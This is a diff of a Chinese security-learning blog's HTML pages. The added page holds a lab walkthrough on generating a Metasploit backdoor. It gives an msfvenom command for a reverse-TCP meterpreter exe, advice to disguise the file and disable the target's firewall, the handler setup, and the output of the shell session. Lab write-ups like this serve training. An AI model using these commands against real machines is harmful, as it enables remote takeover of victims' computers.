@@ -82,7 +82,7 @@
 <meta name="description" content="多一份网络防护技能,多一份信息安全保证">
 <meta property="og:type" content="website">
 <meta property="og:title" content="changyouB-log">
-<meta property="og:url" content="blog.shenzihao.top/archives/2019/index.html">
+<meta property="og:url" content="blog.shenzihao.top/page/2/index.html">
 <meta property="og:site_name" content="changyouB-log">
 <meta property="og:description" content="多一份网络防护技能,多一份信息安全保证">
 <meta property="og:locale" content="zh-CN">
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="blog.shenzihao.top/archives/2019/">
+  <link rel="canonical" href="blog.shenzihao.top/page/2/">
 
 
 
 
 
-  <title>Archive | changyouB-log</title>
+  <title>changyouB-log</title>
   
 
 
@@ -143,7 +143,8 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -206,391 +207,319 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
 
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
 
-      <span class="archive-page-counter">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/09/metasploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="申子昊">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="changyouB-log">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/09/metasploit/" itemprop="url">metasploit之后门的生成</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T17:56:41+08:00">
+                2019-08-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
         
           
-        
-        Um..! 12 posts in total. Keep on posting.
-      </span>
-
-      
-
-        
-        
-        
-
-        
+            <h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
+<hr>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kali linux ip 192.168.10.128  </p>
+<p>WIN7 ip 10.0.2.2 </p>
+<hr>
+<p>选择以下攻击载荷并生成一个exe的木马程序</p>
+<p>命令msfconsole 开启Metasploit</p>
+<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷</p>
+<p>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe</p>
+<p>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
+<hr>
+<p><strong>使用命令 cd /，可以看到我们生成的exe文件</strong></p>
+<hr>
+<p>接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
+<hr>
+<p>为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。</p>
+<p>在kali linux上打开ssh服务的方法：</p>
+<p>apt-get install openssh-server#安装</p>
+<p>一、配置SSH参数</p>
+<p>修改sshd_config文件，命令为：</p>
+<p>vi /etc/ssh/sshd_config</p>
+<p>将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes</p>
+<p>右击桌面，单击打开终端，输入命令</p>
+<p>将PermitRootLogin without-password修改为</p>
+<p>PermitRootLogin yes</p>
+<p>二、启动SSH服务</p>
+<p>命令为：</p>
+<p>/etc/init.d/ssh start</p>
+<p>或者</p>
+<p>service ssh start</p>
+<p>查看SSH服务状态是否正常运行，命令为</p>
+<p>/etc/init.d/ssh status</p>
+<p>或者service ssh status</p>
+<p>那么需要生成两个密钥：</p>
+<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</p>
+<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
+<p>执行命令后都会让输入密码，直接敲回车设置为空即可</p>
+<hr>
+<p><strong>Win7关闭防火墙的方法</strong></p>
+<hr>
+<p>接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
+<hr>
+<p>在msf中设置监听</p>
+<p>use exploit/multi/handler </p>
+<p>show options </p>
+<p>设置我们后门生成时的攻击载荷</p>
+<p>set payload windows/meterpreter/reverse_tcp</p>
+<p>show options </p>
+<p>set payload windows/meterpreter/reverse_tcp</p>
+<p>payload =&gt; windows/meterpreter/reverse_tcp</p>
+<hr>
+<p>设置参数（与后门的参数相对应）</p>
+<p>msf exploit(multi/handler) &gt; set LHOST 192.168.10.128</p>
+<p>LHOST =&gt; 192.168.10.128</p>
+<p>msf exploit(multi/handler) &gt; set LPORT 4444</p>
+<p>LPORT =&gt; 4444</p>
+<p>msf exploit(multi/handler) &gt; run</p>
+<hr>
+<p>在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程</p>
+<p>序时，会弹回一个shell</p>
+<p>[*] Started reverse TCP handler on 192.168.10.128:4444 </p>
+<p>[*] Sending stage (179779 bytes) to 192.168.10.1</p>
+<p>[*] Sleeping before handling stage…</p>
+<p>[*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
+<hr>
+<hr>
+<h3 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h3>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
         
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/xss实战/" itemprop="url">
-              
-                <span itemprop="name">xss实战</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T19:31:05+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/XSS/" itemprop="url">
-              
-                <span itemprop="name">XSS简介</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T19:11:36+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/MSF实验/" itemprop="url">
-              
-                <span itemprop="name">MSF实验</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T11:39:25+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/权限维持实验/" itemprop="url">
-              
-                <span itemprop="name">权限维持实验</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T11:30:12+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/嗅探欺骗实验/" itemprop="url">
-              
-                <span itemprop="name">嗅探欺骗实验</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T11:15:58+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/日志清除实验/" itemprop="url">
-              
-                <span itemprop="name">日志清除实验</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T11:09:45+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/windows-server-2008基础/" itemprop="url">
-              
-                <span itemprop="name">windows server 2008基础内容</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T10:33:24+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/linux常用命令/" itemprop="url">
-              
-                <span itemprop="name">linux常用命令</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T10:19:23+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/10/CentOS-7/" itemprop="url">
-              
-                <span itemprop="name">CentOS 7</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-10T10:14:46+08:00" content="2019-08-10">
-          08-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/09/SRC/" itemprop="url">
-              
-                <span itemprop="name">SRC</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-09T19:18:11+08:00" content="2019-08-09">
-          08-09
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
   </div>
   
   
   
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/08/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="申子昊">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="changyouB-log">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/08/hello-world/" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-08T18:27:27+08:00">
+                2019-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="不着急-不害怕-不要脸-无所谓"><a href="#不着急-不害怕-不要脸-无所谓" class="headerlink" title="不着急  不害怕 不要脸 无所谓"></a>不着急  不害怕 不要脸 无所谓</h3>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/2019/page/2/">2</a><a class="extend next" rel="next" href="/archives/2019/page/2/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
   </nav>
-
 
 
 
